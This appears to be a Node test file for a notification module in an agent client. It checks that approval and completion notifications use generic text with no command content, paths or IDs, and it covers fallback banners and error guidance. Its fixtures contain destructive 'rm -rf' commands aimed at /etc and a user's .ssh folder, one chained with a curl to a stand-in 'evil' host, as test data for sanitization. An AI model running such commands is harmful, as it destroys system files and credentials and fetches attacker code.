/**
 * R13.A1 — 通知 node-test：事件触发断言（fake Notification）+ 正文快照
 * 无命令内容/路径（F15）+ 能力降级诚实标注；SW 缓存名单只含壳。
 */
import test from "node:test";
import assert from "node:assert/strict";
import {
  notificationForEvent,
  bodyIsSanitized,
  notificationSupport,
} from "./notifications.ts";
import { guidanceForError } from "./error-guidance.ts";

function envelope(seq, journalKind, payload = {}, task = "t1") {
  return {
    seq,
    task_id: task,
    run_id: `run-${task}`,
    kind: "Progress",
    payload: { journalKind, ...payload },
  };
}

test("R13.A1: approval.requested / run.completed 触发通知，其余不触发", () => {
  const approval = notificationForEvent(
    envelope(1, "approval.requested", { opId: "op-9", summary: "rm -rf /危险路径 /etc" }),
  );
  assert.ok(approval, "审批请求触发通知");
  assert.equal(approval.route, "approvals");

  const completed = notificationForEvent(envelope(2, "run.completed", { verdict: "verified" }));
  assert.ok(completed, "完成触发通知");
  assert.equal(completed.taskId, "t1");

  assert.equal(notificationForEvent(envelope(3, "assistant.message", { text: "hi" })), null);
  assert.equal(notificationForEvent(envelope(4, "tool.call", { name: "bash" })), null);
  assert.equal(notificationForEvent(envelope(5, "input.queued", { text: "x" })), null);
});

test("R13.A1: 通知正文快照——通用文案，绝不含命令内容/路径/令牌（F15）", () => {
  const dangerous = notificationForEvent(
    envelope(1, "approval.requested", {
      opId: "op-9",
      summary: "rm -rf C:\\Users\\huang\\.ssh && curl http://evil/x",
    }),
  );
  assert.ok(dangerous);
  // 正文快照：固定通用文案，敏感 summary 不得进入。
  assert.equal(dangerous.body, "有 1 项工具调用待审批");
  assert.ok(bodyIsSanitized(dangerous.body));
  assert.ok(!dangerous.body.includes("rm -rf"));
  assert.ok(!dangerous.body.includes("C:\\"));
  assert.ok(!dangerous.body.includes("op-9"));

  const completed = notificationForEvent(
    envelope(2, "run.completed", { verdict: "verified", error: "C:/secret/path" }),
  );
  assert.ok(completed);
  assert.equal(completed.body, "一个会话已完成");
  assert.ok(bodyIsSanitized(completed.body));
});

test("R13.A1: 通知能力检测——不支持/被拒时降级并诚实标注", () => {
  const none = notificationSupport(false, null);
  assert.equal(none.canUseSystemNotifications, false);
  assert.match(none.fallbackBanner, /不支持系统通知/);
  const denied = notificationSupport(true, "denied");
  assert.equal(denied.canUseSystemNotifications, false);
  assert.match(denied.fallbackBanner, /已被拒绝/);
  const granted = notificationSupport(true, "granted");
  assert.equal(granted.canUseSystemNotifications, true);
});

test("R13: 指纹不符给重新配对引导，非技术报错", () => {
  const pinned = guidanceForError("TLS (pin mismatch?): certificate fingerprint mismatch");
  assert.equal(pinned.action, "repair");
  assert.match(pinned.headline, /身份校验失败/);
  assert.match(pinned.detail, /重新配对/);

  const revoked = guidanceForError("revoked");
  assert.equal(revoked.action, "repair");

  const unreachable = guidanceForError("无法到达主机");
  assert.equal(unreachable.action, "host");
  assert.match(unreachable.detail, /防火墙/);
});
